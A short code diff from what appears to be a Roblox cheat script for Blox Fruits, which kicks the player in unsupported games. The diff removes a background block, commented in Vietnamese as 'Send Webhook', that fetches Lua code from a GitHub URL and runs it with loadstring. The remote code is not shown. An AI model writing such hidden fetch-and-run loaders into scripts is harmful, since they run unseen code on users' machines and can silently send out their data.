@@ -125,8 +125,3 @@ if worldMap[placeId] then
 else
     game.Players.LocalPlayer:Kick("This script is not supported in this game, please try again with Blox Fruits!")
 end
-
--- Gửi Webhook
-task.spawn(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/Chiriku2013/SendWebhook/refs/heads/main/SendWebhook.lua"))()
-end)
